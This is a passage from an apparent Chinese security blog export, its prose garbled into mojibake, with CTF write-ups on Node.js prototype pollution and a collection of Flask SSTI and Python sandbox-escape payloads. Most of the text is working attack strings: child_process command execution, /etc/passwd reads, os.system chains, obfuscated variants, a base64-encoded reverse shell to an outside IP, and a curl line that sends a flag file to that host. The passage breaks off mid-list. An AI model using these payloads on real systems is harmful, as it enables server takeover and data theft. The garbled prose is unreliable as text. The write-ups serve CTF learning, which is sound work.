æˆåŠŸç™»å½•åï¼Œç»§ç»­åˆ†æä»£ç ï¼Œå‘ç° 1234567891011121314151617181920const merge = (a, b) =&gt; &#123; for (var attr in b) &#123; if (isObject(a[attr]) &amp;&amp; isObject(b[attr])) &#123; merge(a[attr], b[attr]); &#125; else &#123; a[attr] = b[attr]; &#125; &#125; return a&#125;const clone = (a) =&gt; &#123; return merge(&#123;&#125;, a);&#125;...req.session.user.data = clone(req.body);router.get(&apos;/info&apos;, function (req, res) &#123; res.render(&apos;index&apos;,data=&#123;&apos;user&apos;:res.outputFunctionName&#125;);&#125;) /actionæ±¡æŸ“åŸå‹é“¾ /infoè§¦å‘æ±¡æŸ“çš„åŸå‹é“¾ è®¾ç½®objectçš„outputFunctionNameçš„å±æ€§ï¼š{&quot;__proto__&quot;:{&quot;outputFunctionName&quot;:&quot;xxx&quot;}} payload 1&#123;&quot;__proto__&quot;:&#123;&quot;outputFunctionName&quot;:&quot;_tmp1;global.process.mainModule.require(&apos;child_process&apos;).exec(&apos;bash -c \\&quot;cat /flag &gt; /app/public/flag\\&quot;&apos;);var __tmp2&quot;&#125;&#125; å¤±è´¥äº†ï¼Œå°±æƒ³è°ƒè¯•ä¸‹jsï¼Œæœ¬åœ°æ­å»º 12#å®‰è£…æ¨¡å—npm install å‘ç°æ²¡æœ‰æä¾›ç«¯å£å¯åŠ¨ï¼ŒåŸæ–‡ä»¶æ˜¯åˆ©ç”¨bin/wwwé‡Œé¢å¯åŠ¨çš„ï¼Œä¸ºäº†æ–¹ä¾¿ç›´æ¥æ·»åŠ  1234567//ç›‘å¬ç«¯å£ä¸º3000var server = app.listen(3000, function () &#123; var host = server.address().address; var port = server.address().port; console.log(&apos;Example app listening at http://%s:%s&apos;, host, port);&#125;); node --inspect --debug-brk app.jså¯åŠ¨å³å¯åˆ©ç”¨chromeè‡ªå¸¦çš„è°ƒè¯• nodejsè°ƒè¯• æœªmerge()å‰ merge()å çœ‹ä¸‹æºç æ‰æ³¨æ„åˆ°req.session.user.data = clone(req.body); æ˜¯æ•´ä¸ªbodyã€‚ã€‚ã€‚ä¿®æ”¹è¯·æ±‚ä½“å³å¯ ä¹‹å‰çš„payloadå¤±è´¥æ˜¯å› ä¸ºæ²¡æœ‰ç”¨jsonæ ¼å¼å‘é€==ï¼ è®¿é—®/infoè§¦å‘åŸå‹é“¾ï¼Œè®¿é—®/flagä¸‹è½½å³å¯ Codebreaking-thejs server.js 123456789101112131415161718192021222324252627282930313233343536373839404142const fs = require(&apos;fs&apos;)const express = require(&apos;express&apos;)const bodyParser = require(&apos;body-parser&apos;)const lodash = require(&apos;lodash&apos;)const session = require(&apos;express-session&apos;)const randomize = require(&apos;randomatic&apos;)const app = express()app.use(bodyParser.urlencoded(&#123;extended: true&#125;)).use(bodyParser.json())app.use(&apos;/static&apos;, express.static(&apos;static&apos;))app.use(session(&#123; name: &apos;thejs.session&apos;, secret: randomize(&apos;aA0&apos;, 16), resave: false, saveUninitialized: false&#125;))app.engine(&apos;ejs&apos;, function (filePath, options, callback) &#123; // define the template engine fs.readFile(filePath, (err, content) =&gt; &#123; if (err) return callback(new Error(err)) let compiled = lodash.template(content) let rendered = compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)app.set(&apos;views&apos;, &apos;./views&apos;)app.set(&apos;view engine&apos;, &apos;ejs&apos;)app.all(&apos;/&apos;, (req, res) =&gt; &#123; let data = req.session.data || &#123;language: [], category: []&#125; if (req.method == &apos;POST&apos;) &#123; data = lodash.merge(data, req.body) req.session.data = data &#125; res.render(&apos;index&apos;, &#123; language: data.language, category: data.category &#125;)&#125;)app.listen(3000, () =&gt; console.log(`Example app listening on port 3000!`)) ä½¿ç”¨ lodash å®ç°äº†ä¸€ä¸ªç®€å•çš„ ejs æ¨¡ç‰ˆå¼•æ“ï¼Œåœ¨è¯·æ±‚çš„æ—¶å€™æ¸²æŸ“ã€‚ lodashè¿™ä¸ªæ¨¡å—æä¾›äº†ä¸¤ä¸ªå·¥å…·lodash.templateå’Œlodash.mergeï¼Œåˆ†åˆ«å¯ç”¨æ¥è¿›è¡ŒåŸå‹é“¾æ±¡æŸ“å’ŒåŸå‹é“¾è§¦å‘ mergeå°±å¯ä»¥æƒ³åˆ°ä¹‹å‰åˆ†æçš„åŸå‹é“¾æ±¡æŸ“çš„è§¦å‘ç‚¹ï¼Œå› ä¸ºè¿™æ˜¯ä¸€ä¸ªexpressæ¡†æ¶ï¼Œæ”¯æŒJsonç›´æ¥ä¼ è¾“æ•°æ®ï¼Œå¹¶ä¸”æ¥æ”¶çš„å‚æ•°ä¸ºreq.body lodash.templateçš„æºç  https://github.com/lodash/lodash/blob/a039483886093788e7021131a9cba6ffc53f45ec/lodash.template/index.js#L1089 1234var result = attempt(function() &#123; return Function(importsKeys, sourceURL + &apos;return &apos; + source) .apply(undefined, importsValues);&#125;); è¿½è¸ªsourceURL 1var sourceURL = &apos;sourceURL&apos; in options ? &apos;//# sourceURL=&apos; + options.sourceURL + &apos;\\n&apos; : &apos;&apos;; å…¶ä¸­ option ä¸ºæˆ‘ä»¬åœ¨æ¨¡ç‰ˆå¼•æ“ä¸­ï¼Œæ¸²æŸ“çš„å€¼ã€‚è¿™é‡Œè¯»å–å…¶ä¸­çš„ sourceURL å±æ€§çš„å€¼ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™é‡Œè§¦å‘åŸå‹æ±¡æŸ“ payload 1&#123;&quot;constructor&quot;:&#123;&quot;prototype&quot;:&#123;&quot;sourceURL&quot;:&quot;\\r\\nreturn e =&gt;&#123;return global.process.mainModule.require(&apos;child_process&apos;).execSync(&apos;id&apos;);&#125;&quot;&#125;&#125;&#125; æ€»ç»“ç®€å•å­¦ä¹ äº†JavaScriptåŸå‹é“¾æ±¡æŸ“çš„åŸç†ä»¥åŠä¸¤é“ç®€å•çš„é¢˜ï¼Œä¸‹ä¸€æ­¥å­¦ä¹ å¯ä»¥æ˜¯ä¸€äº›æºç æ›´åŠ å¤æ‚ï¼Œæˆ–è€…ä¸å…¶ä»–æ¼æ´ç»“åˆåˆ©ç”¨ã€‚ å‚è€ƒé“¾æ¥ï¼š https://www.anquanke.com/post/id/176884 https://nikoeurus.github.io/2019/11/30/JavaScript%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/","categories":[],"tags":[{"name":"js","slug":"js","permalink":"https://glotozz.github.io/tags/js/"}]},{"title":"flaskæ¨¡ç‰ˆæ³¨å…¥","slug":"flaskæ¨¡ç‰ˆæ³¨å…¥","date":"2020-02-24T01:11:15.000Z","updated":"2020-02-27T08:01:06.704Z","comments":true,"path":"2020/02/24/flaskæ¨¡ç‰ˆæ³¨å…¥/","link":"","permalink":"https://glotozz.github.io/2020/02/24/flaskæ¨¡ç‰ˆæ³¨å…¥/","excerpt":"","text":"æ¼æ´åŸç†å‚è€ƒï¼š https://www.freebuf.com/column/187845.html æ¼æ´åŸç†ç”¨ä¸€å¥è¯æ¦‚æ‹¬ï¼šä¸æ­£ç¡®çš„ä½¿ç”¨flaskä¸­çš„render_template_string()å¯¼è‡´çš„SSTIï¼Œå¹¶ä¸”æ¨¡æ¿å†…å®¹ç›´æ¥å—ç”¨æˆ·æ§åˆ¶ è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯å€Ÿflask SSTIå¤ä¹ ä¸‹pythonæ²™ç›’é€ƒé€¸ï¼Œæ•´ç†ä¸‹payloadï¼Œç†è®ºä¸Šä¸åŒæœºå™¨ã€ä¸åŒpythonç‰ˆæœ¬çš„payloadæ˜¯ä¸å°½ç›¸åŒçš„ã€‚ æµ‹è¯•ä»£ç  1234567@app.route('/')def test(): code = request.args.get('id') html = ''' &lt;h3&gt;%s&lt;/h3&gt; '''%(code) return render_template_string(html) ä¸¤ç§å¯åŠ¨æ–¹å¼ï¼š flask run --host=0.0.0.0ï¼Œéœ€è¦å¯åŠ¨çš„æ—¶å€™è®¾ç½®hostï¼Œapp.run()ä¸­æ›´æ”¹æ— æ•ˆ python app.pyï¼Œåœ¨app.run()ä¸­è®¾ç½®hostï¼Œåˆ‡æ¢pythonç‰ˆæœ¬æ¯”è¾ƒæ–¹ä¾¿ ç¡®è®¤æ­£å¸¸è®¿é—® å…¨å±€å˜é‡,æ¯”è¾ƒå¸¸è§çš„è¯»å–æ˜¯SECRET_KEY æ–‡ä»¶è¯»å–/å‘½ä»¤æ‰§è¡Œæ— è®ºæ˜¯å®ç°æ–‡ä»¶è¯»å–è¿˜æ˜¯å‘½ä»¤æ‰§è¡Œï¼Œéœ€è¦åˆ©ç”¨å¯¹è±¡çš„ç»§æ‰¿ï¼Œå…ˆæ‰¾åˆ°çˆ¶ç±»&lt;type &#39;object&#39;&gt;ï¼Œå†å¯»æ‰¾å­ç±»ï¼Œæœ€åæ‰¾åˆ°æˆ‘ä»¬éœ€è¦ç”¨åˆ°çš„ç›¸åº”æ¨¡å— å‡ ä¸ªè¦ç”¨åˆ°çš„é­”æœ¯æ–¹æ³• 12345678__class__ è¿”å›ç±»å‹æ‰€å±çš„å¯¹è±¡__mro__ è¿”å›ä¸€ä¸ªåŒ…å«å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»å…ƒç»„ï¼Œæ–¹æ³•åœ¨è§£ææ—¶æŒ‰ç…§å…ƒç»„çš„é¡ºåºè§£æã€‚__base__ è¿”å›è¯¥å¯¹è±¡æ‰€ç»§æ‰¿çš„åŸºç±»// __base__å’Œ__mro__éƒ½æ˜¯ç”¨æ¥å¯»æ‰¾åŸºç±»çš„__subclasses__ æ¯ä¸ªæ–°ç±»éƒ½ä¿ç•™äº†å­ç±»çš„å¼•ç”¨ï¼Œè¿™ä¸ªæ–¹æ³•è¿”å›ä¸€ä¸ªç±»ä¸­ä»ç„¶å¯ç”¨çš„çš„å¼•ç”¨çš„åˆ—è¡¨__init__ ç±»çš„åˆå§‹åŒ–æ–¹æ³•__globals__ å¯¹åŒ…å«å‡½æ•°å…¨å±€å˜é‡çš„å­—å…¸çš„å¼•ç”¨ å…ˆæµ‹è¯•Python 2.7.17 éœ€è¦å…ˆé€‰å–ä¸€ä¸ªç±»ï¼Œå‡ ç§å¸¸è§çš„ç±»&#39;&#39;ã€requestã€[]ã€() 1ã€è·å–ç±»å¯¹è±¡ 123456789&gt;&gt;&gt; &apos;&apos;.__class__&lt;type &apos;str&apos;&gt;&gt;&gt;&gt; import request&gt;&gt;&gt; request.__class__&lt;type &apos;module&apos;&gt;&gt;&gt;&gt; [].__class__&lt;type &apos;list&apos;&gt;&gt;&gt;&gt; ().__class__&lt;type &apos;tuple&apos;&gt; 2ã€å¯»æ‰¾åŸºç±»object 12345678910111213&gt;&gt;&gt; &apos;&apos;.__class__.__mro__(&lt;type &apos;str&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;object&apos;&gt;)&gt;&gt;&gt; request.__class__.__mro__(&lt;type &apos;module&apos;&gt;, &lt;type &apos;object&apos;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;type &apos;list&apos;&gt;, &lt;type &apos;object&apos;&gt;)&gt;&gt;&gt; ().__class__.__mro__(&lt;type &apos;tuple&apos;&gt;, &lt;type &apos;object&apos;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;type &apos;object&apos;&gt;&gt;&gt;&gt; ().__class__.__base__&lt;type &apos;object&apos;&gt; objectåœ¨æœ€åº•å±‚æ•…åœ¨åˆ—è¡¨ä¸­çš„æœ€åï¼Œé€šè¿‡__mro__[-1]å¯ä»¥è·å–åˆ° 3ã€å¯»æ‰¾å¯ç”¨çš„å¼•ç”¨ 12&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[2].__subclasses__()[&lt;type &apos;type&apos;&gt;, &lt;type &apos;weakref&apos;&gt;, &lt;type &apos;weakcallableproxy&apos;&gt;, &lt;type &apos;weakproxy&apos;&gt;, &lt;type &apos;int&apos;&gt;, &lt;type &apos;basestring&apos;&gt;, &lt;type &apos;bytearray&apos;&gt;, &lt;type &apos;list&apos;&gt;, &lt;type &apos;NoneType&apos;&gt;, &lt;type &apos;NotImplementedType&apos;&gt;, &lt;type &apos;traceback&apos;&gt;, &lt;type &apos;super&apos;&gt;, &lt;type &apos;xrange&apos;&gt;, &lt;type &apos;dict&apos;&gt;, &lt;type &apos;set&apos;&gt;, &lt;type &apos;slice&apos;&gt;, &lt;type &apos;staticmethod&apos;&gt;, &lt;type &apos;complex&apos;&gt;, &lt;type &apos;float&apos;&gt;, &lt;type &apos;buffer&apos;&gt;, &lt;type &apos;long&apos;&gt;, &lt;type &apos;frozenset&apos;&gt;, &lt;type &apos;property&apos;&gt;, &lt;type &apos;memoryview&apos;&gt;, &lt;type &apos;tuple&apos;&gt;, &lt;type &apos;enumerate&apos;&gt;, &lt;type &apos;reversed&apos;&gt;, &lt;type &apos;code&apos;&gt;, &lt;type &apos;frame&apos;&gt;, &lt;type &apos;builtin_function_or_method&apos;&gt;, &lt;type &apos;instancemethod&apos;&gt;, &lt;type &apos;function&apos;&gt;, &lt;type &apos;classobj&apos;&gt;, &lt;type &apos;dictproxy&apos;&gt;, &lt;type &apos;generator&apos;&gt;, &lt;type &apos;getset_descriptor&apos;&gt;, &lt;type &apos;wrapper_descriptor&apos;&gt;, &lt;type &apos;instance&apos;&gt;, &lt;type &apos;ellipsis&apos;&gt;, &lt;type &apos;member_descriptor&apos;&gt;, &lt;type &apos;file&apos;&gt;, &lt;type &apos;PyCapsule&apos;&gt;, &lt;type &apos;cell&apos;&gt;, &lt;type &apos;callable-iterator&apos;&gt;, &lt;type &apos;iterator&apos;&gt;, &lt;type &apos;sys.long_info&apos;&gt;, &lt;type &apos;sys.float_info&apos;&gt;, &lt;type &apos;EncodingMap&apos;&gt;, &lt;type &apos;fieldnameiterator&apos;&gt;, &lt;type &apos;formatteriterator&apos;&gt;, &lt;type &apos;sys.version_info&apos;&gt;, &lt;type &apos;sys.flags&apos;&gt;, &lt;type &apos;exceptions.BaseException&apos;&gt;, &lt;type &apos;module&apos;&gt;, &lt;type &apos;imp.NullImporter&apos;&gt;, &lt;type &apos;zipimport.zipimporter&apos;&gt;, &lt;type &apos;posix.stat_result&apos;&gt;, &lt;type &apos;posix.statvfs_result&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;_weakrefset._IterationGuard&apos;&gt;, &lt;class &apos;_weakrefset.WeakSet&apos;&gt;, &lt;class &apos;_abcoll.Hashable&apos;&gt;, &lt;type &apos;classmethod&apos;&gt;, &lt;class &apos;_abcoll.Iterable&apos;&gt;, &lt;class &apos;_abcoll.Sized&apos;&gt;, &lt;class &apos;_abcoll.Container&apos;&gt;, &lt;class &apos;_abcoll.Callable&apos;&gt;, &lt;type &apos;dict_keys&apos;&gt;, &lt;type &apos;dict_items&apos;&gt;, &lt;type &apos;dict_values&apos;&gt;, &lt;class &apos;site._Printer&apos;&gt;, &lt;class &apos;site._Helper&apos;&gt;, &lt;type &apos;_sre.SRE_Pattern&apos;&gt;, &lt;type &apos;_sre.SRE_Match&apos;&gt;, &lt;type &apos;_sre.SRE_Scanner&apos;&gt;, &lt;class &apos;site.Quitter&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;class &apos;urlparse.ResultMixin&apos;&gt;, &lt;type &apos;collections.deque&apos;&gt;, &lt;type &apos;deque_iterator&apos;&gt;, &lt;type &apos;deque_reverse_iterator&apos;&gt;, &lt;type &apos;operator.itemgetter&apos;&gt;, &lt;type &apos;operator.attrgetter&apos;&gt;, &lt;type &apos;operator.methodcaller&apos;&gt;, &lt;type &apos;itertools.combinations&apos;&gt;, &lt;type &apos;itertools.combinations_with_replacement&apos;&gt;, &lt;type &apos;itertools.cycle&apos;&gt;, &lt;type &apos;itertools.dropwhile&apos;&gt;, &lt;type &apos;itertools.takewhile&apos;&gt;, &lt;type &apos;itertools.islice&apos;&gt;, &lt;type &apos;itertools.starmap&apos;&gt;, &lt;type &apos;itertools.imap&apos;&gt;, &lt;type &apos;itertools.chain&apos;&gt;, &lt;type &apos;itertools.compress&apos;&gt;, &lt;type &apos;itertools.ifilter&apos;&gt;, &lt;type &apos;itertools.ifilterfalse&apos;&gt;, &lt;type &apos;itertools.count&apos;&gt;, &lt;type &apos;itertools.izip&apos;&gt;, &lt;type &apos;itertools.izip_longest&apos;&gt;, &lt;type &apos;itertools.permutations&apos;&gt;, &lt;type &apos;itertools.product&apos;&gt;, &lt;type &apos;itertools.repeat&apos;&gt;, &lt;type &apos;itertools.groupby&apos;&gt;, &lt;type &apos;itertools.tee_dataobject&apos;&gt;, &lt;type &apos;itertools.tee&apos;&gt;, &lt;type &apos;itertools._grouper&apos;&gt;, &lt;type &apos;_thread._localdummy&apos;&gt;, &lt;type &apos;thread._local&apos;&gt;, &lt;type &apos;thread.lock&apos;&gt;, &lt;class &apos;string.Template&apos;&gt;, &lt;class &apos;string.Formatter&apos;&gt;, &lt;type &apos;_io._IOBase&apos;&gt;, &lt;type &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;type &apos;_hashlib.HASH&apos;&gt;, &lt;type &apos;_random.Random&apos;&gt;, &lt;type &apos;cStringIO.StringO&apos;&gt;, &lt;type &apos;cStringIO.StringI&apos;&gt;, &lt;type &apos;time.struct_time&apos;&gt;] 4ã€æ–‡ä»¶è¯»å– Payload 1 å‘ç°40çš„åœ°æ–¹å­˜åœ¨ &lt;type &#39;file&#39;&gt; 12&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read()request.__class__.__mro__[1].__subclasses__()[40](&apos;/etc/passwd&apos;).read() æŸ¥ä¸‹æ ‡ 1[().__class__.__bases__[0].__subclasses__()[i].__name__ for i in range(len(().__class__.__bases__[0].__subclasses__()))].index(&apos;file&apos;) 1234567#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[2].__subclasses__(): print num print item num+=1 Payload 2 1259&lt;class &apos;warnings.catch_warnings&apos;&gt; 1&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;/etc/passwd&apos;).read() 5ã€å‘½ä»¤æ‰§è¡Œ å¯»æ‰¾åŒ…å«osæ¨¡å—çš„è„šæœ¬ 1234567891011#!/usr/bin/env python# encoding: utf-8num = 0for item in ''.__class__.__mro__[-1].__subclasses__(): try: if 'os' in item.__init__.__globals__: print num,item num+=1 except: print '-' num+=1 å¾—åˆ° 12345671 &lt;class &apos;site._Printer&apos;&gt;----76 &lt;class &apos;site.Quitter&apos;&gt; å‰é¢å·²ç»æ‰¾åˆ°äº†åŒ…å«osæ¨¡å—çš„ç±»ï¼Œå…ˆåˆå§‹åŒ–ï¼Œå†å¼•ç”¨å³å¯ 1&apos;&apos;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;ls&apos;) åªä¸è¿‡å‘½ä»¤æ‰§è¡Œæ²¡æœ‰å›æ˜¾ï¼Œéœ€è¦åå¼¹shellæˆ–è€…åˆ©ç”¨curlå¸¦å‡º åå¼¹shell 1&apos;&apos;.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMTcuNzguMS4yMDQvMTIzNCAwPiYxCg==|base64 -d|bash&apos;) curlå¸¦å‡º 1&apos;&apos;.__class__.__mro__[-1].__subclasses__()[71].__init__.__globals__[&apos;os&apos;].system(&apos;data=$(cat /fffffflag | base64);curl http://117.78.1.204/?data=$data;&apos;) catch_warningsä¹Ÿå¯ä»¥è¿›ä¸€æ­¥æ„é€ æ¥æ‰§è¡Œå‘½ä»¤ 1259&lt;class &apos;warnings.catch_warnings&apos;&gt; å…ˆä»‹ç»ä¸¤ä¸ªå±æ€§ï¼Œå·²çŸ¥å‡½æ•°åå¯è·å–å‡½æ•°ä¿¡æ¯ 1234567891011def fun(x=1): # nothing here a=x*2 flag=&apos;neko&apos; return aprint fun.func_code.co_constsprint fun.func_globals=&gt;(None, 2, &apos;neko&apos;)&#123;&apos;__builtins__&apos;: &lt;module &apos;__builtin__&apos; (built-in)&gt;, &apos;__file__&apos;: &apos;b.py&apos;, &apos;__package__&apos;: None, &apos;fun&apos;: &lt;function fun at 0x7f1b9317e750&gt;, &apos;__name__&apos;: &apos;__main__&apos;, &apos;__doc__&apos;: None&#125; å¯æ„é€  1[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&quot;linecache&quot;].__dict__[&apos;os&apos;].__dict__[&apos;system&apos;](&apos;ls&apos;) è¿˜æœ‰å‡ ç§å˜å½¢ 1234567891011__import__(&quot;o&quot;+&quot;s&quot;).__getattribute__(&apos;sys&apos;+&apos;tem&apos;)(&quot;l&quot;+&quot;s&quot;)__builtins__.__dict__[&apos;X19pbXBvcnRfXw==&apos;.decode(&apos;base64&apos;)](&apos;b3M=&apos;.decode(&apos;base64&apos;)).__getattribute__(&apos;sys&apos;+&apos;tem&apos;)(&apos;l&apos;+&apos;s&apos;)[].__class__.__base__.__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;ls&apos;)[].__class__.__base__.__subclasses__()[59].__init__.func_globals[&apos;linecache&apos;].__dict__.values()[12].system(&apos;ls&apos;)[].__class__.__base__.__subclasses__()[59]()._module.linecache.os.system(&apos;ls&apos;)&#123;(lambda getthem=([x for x in ().__class__.__base__.__subclasses__() if x.__name__==&apos;catch_warnings&apos;][0]()._module.__builtins__):getthem[&apos;__import__&apos;](&apos;os&apos;).system(&apos;ls&apos;))()&#125; Python 3.7.5 1ã€è·å–ç±»å¯¹è±¡ 123456&gt;&gt;&gt; &apos;&apos;.__class__&lt;class &apos;str&apos;&gt;&gt;&gt;&gt; ().__class__&lt;class &apos;tuple&apos;&gt;&gt;&gt;&gt; [].__class__&lt;class &apos;list&apos;&gt; 2ã€å¯»æ‰¾åŸºç±»object 1234567&gt;&gt;&gt; &apos;&apos;.__class__.__mro__(&lt;class &apos;str&apos;&gt;, &lt;class &apos;object&apos;&gt;)&gt;&gt;&gt; [].__class__.__mro__(&lt;class &apos;list&apos;&gt;, &lt;class &apos;object&apos;&gt;)&gt;&gt;&gt; [].__class__.__base__&lt;class &apos;object&apos;&gt; 3ã€å¯»æ‰¾å¯ç”¨çš„å¼•ç”¨ 12&gt;&gt;&gt; &apos;&apos;.__class__.__mro__[-1].__subclasses__()[&lt;class &apos;type&apos;&gt;, &lt;class &apos;weakref&apos;&gt;, &lt;class &apos;weakcallableproxy&apos;&gt;, &lt;class &apos;weakproxy&apos;&gt;, &lt;class &apos;int&apos;&gt;, &lt;class &apos;bytearray&apos;&gt;, &lt;class &apos;bytes&apos;&gt;, &lt;class &apos;list&apos;&gt;, &lt;class &apos;NoneType&apos;&gt;, &lt;class &apos;NotImplementedType&apos;&gt;, &lt;class &apos;traceback&apos;&gt;, &lt;class &apos;super&apos;&gt;, &lt;class &apos;range&apos;&gt;, &lt;class &apos;dict&apos;&gt;, &lt;class &apos;dict_keys&apos;&gt;, &lt;class &apos;dict_values&apos;&gt;, &lt;class &apos;dict_items&apos;&gt;, &lt;class &apos;odict_iterator&apos;&gt;, &lt;class &apos;set&apos;&gt;, &lt;class &apos;str&apos;&gt;, &lt;class &apos;slice&apos;&gt;, &lt;class &apos;staticmethod&apos;&gt;, &lt;class &apos;complex&apos;&gt;, &lt;class &apos;float&apos;&gt;, &lt;class &apos;frozenset&apos;&gt;, &lt;class &apos;property&apos;&gt;, &lt;class &apos;managedbuffer&apos;&gt;, &lt;class &apos;memoryview&apos;&gt;, &lt;class &apos;tuple&apos;&gt;, &lt;class &apos;enumerate&apos;&gt;, &lt;class &apos;reversed&apos;&gt;, &lt;class &apos;stderrprinter&apos;&gt;, &lt;class &apos;code&apos;&gt;, &lt;class &apos;frame&apos;&gt;, &lt;class &apos;builtin_function_or_method&apos;&gt;, &lt;class &apos;method&apos;&gt;, &lt;class &apos;function&apos;&gt;, &lt;class &apos;mappingproxy&apos;&gt;, &lt;class &apos;generator&apos;&gt;, &lt;class &apos;getset_descriptor&apos;&gt;, &lt;class &apos;wrapper_descriptor&apos;&gt;, &lt;class &apos;method-wrapper&apos;&gt;, &lt;class &apos;ellipsis&apos;&gt;, &lt;class &apos;member_descriptor&apos;&gt;, &lt;class &apos;types.SimpleNamespace&apos;&gt;, &lt;class &apos;PyCapsule&apos;&gt;, &lt;class &apos;longrange_iterator&apos;&gt;, &lt;class &apos;cell&apos;&gt;, &lt;class &apos;instancemethod&apos;&gt;, &lt;class &apos;classmethod_descriptor&apos;&gt;, &lt;class &apos;method_descriptor&apos;&gt;, &lt;class &apos;callable_iterator&apos;&gt;, &lt;class &apos;iterator&apos;&gt;, &lt;class &apos;coroutine&apos;&gt;, &lt;class &apos;coroutine_wrapper&apos;&gt;, &lt;class &apos;moduledef&apos;&gt;, &lt;class &apos;module&apos;&gt;, &lt;class &apos;EncodingMap&apos;&gt;, &lt;class &apos;fieldnameiterator&apos;&gt;, &lt;class &apos;formatteriterator&apos;&gt;, &lt;class &apos;filter&apos;&gt;, &lt;class &apos;map&apos;&gt;, &lt;class &apos;zip&apos;&gt;, &lt;class &apos;BaseException&apos;&gt;, &lt;class &apos;hamt&apos;&gt;, &lt;class &apos;hamt_array_node&apos;&gt;, &lt;class &apos;hamt_bitmap_node&apos;&gt;, &lt;class &apos;hamt_collision_node&apos;&gt;, &lt;class &apos;keys&apos;&gt;, &lt;class &apos;values&apos;&gt;, &lt;class &apos;items&apos;&gt;, &lt;class &apos;Context&apos;&gt;, &lt;class &apos;ContextVar&apos;&gt;, &lt;class &apos;Token&apos;&gt;, &lt;class &apos;Token.MISSING&apos;&gt;, &lt;class &apos;_frozen_importlib._ModuleLock&apos;&gt;, &lt;class &apos;_frozen_importlib._DummyModuleLock&apos;&gt;, &lt;class &apos;_frozen_importlib._ModuleLockManager&apos;&gt;, &lt;class &apos;_frozen_importlib._installed_safely&apos;&gt;, &lt;class &apos;_frozen_importlib.ModuleSpec&apos;&gt;, &lt;class &apos;_frozen_importlib.BuiltinImporter&apos;&gt;, &lt;class &apos;classmethod&apos;&gt;, &lt;class &apos;_frozen_importlib.FrozenImporter&apos;&gt;, &lt;class &apos;_frozen_importlib._ImportLockContext&apos;&gt;, &lt;class &apos;_thread._localdummy&apos;&gt;, &lt;class &apos;_thread._local&apos;&gt;, &lt;class &apos;_thread.lock&apos;&gt;, &lt;class &apos;_thread.RLock&apos;&gt;, &lt;class &apos;zipimport.zipimporter&apos;&gt;, &lt;class &apos;_frozen_importlib_external.WindowsRegistryFinder&apos;&gt;, &lt;class &apos;_frozen_importlib_external._LoaderBasics&apos;&gt;, &lt;class &apos;_frozen_importlib_external.FileLoader&apos;&gt;, &lt;class &apos;_frozen_importlib_external._NamespacePath&apos;&gt;, &lt;class &apos;_frozen_importlib_external._NamespaceLoader&apos;&gt;, &lt;class &apos;_frozen_importlib_external.PathFinder&apos;&gt;, &lt;class &apos;_frozen_importlib_external.FileFinder&apos;&gt;, &lt;class &apos;_io._IOBase&apos;&gt;, &lt;class &apos;_io._BytesIOBuffer&apos;&gt;, &lt;class &apos;_io.IncrementalNewlineDecoder&apos;&gt;, &lt;class &apos;posix.ScandirIterator&apos;&gt;, &lt;class &apos;posix.DirEntry&apos;&gt;, &lt;class &apos;codecs.Codec&apos;&gt;, &lt;class &apos;codecs.IncrementalEncoder&apos;&gt;, &lt;class &apos;codecs.IncrementalDecoder&apos;&gt;, &lt;class &apos;codecs.StreamReaderWriter&apos;&gt;, &lt;class &apos;codecs.StreamRecoder&apos;&gt;, &lt;class &apos;_abc_data&apos;&gt;, &lt;class &apos;abc.ABC&apos;&gt;, &lt;class &apos;dict_itemiterator&apos;&gt;, &lt;class &apos;collections.abc.Hashable&apos;&gt;, &lt;class &apos;collections.abc.Awaitable&apos;&gt;, &lt;class &apos;collections.abc.AsyncIterable&apos;&gt;, &lt;class &apos;async_generator&apos;&gt;, &lt;class &apos;collections.abc.Iterable&apos;&gt;, &lt;class &apos;bytes_iterator&apos;&gt;, &lt;class &apos;bytearray_iterator&apos;&gt;, &lt;class &apos;dict_keyiterator&apos;&gt;, &lt;class &apos;dict_valueiterator&apos;&gt;, &lt;class &apos;list_iterator&apos;&gt;, &lt;class &apos;list_reverseiterator&apos;&gt;, &lt;class &apos;range_iterator&apos;&gt;, &lt;class &apos;set_iterator&apos;&gt;, &lt;class &apos;str_iterator&apos;&gt;, &lt;class &apos;tuple_iterator&apos;&gt;, &lt;class &apos;collections.abc.Sized&apos;&gt;, &lt;class &apos;collections.abc.Container&apos;&gt;, &lt;class &apos;collections.abc.Callable&apos;&gt;, &lt;class &apos;os._wrap_close&apos;&gt;, &lt;class &apos;_sitebuiltins.Quitter&apos;&gt;, &lt;class &apos;_sitebuiltins._Printer&apos;&gt;, &lt;class &apos;_sitebuiltins._Helper&apos;&gt;, &lt;class &apos;types.DynamicClassAttribute&apos;&gt;, &lt;class &apos;types._GeneratorWrapper&apos;&gt;, &lt;class &apos;warnings.WarningMessage&apos;&gt;, &lt;class &apos;warnings.catch_warnings&apos;&gt;, &lt;class &apos;importlib.abc.Finder&apos;&gt;, &lt;class &apos;importlib.abc.Loader&apos;&gt;, &lt;class &apos;importlib.abc.ResourceReader&apos;&gt;, &lt;class &apos;operator.itemgetter&apos;&gt;, &lt;class &apos;operator.attrgetter&apos;&gt;, &lt;class &apos;operator.methodcaller&apos;&gt;, &lt;class 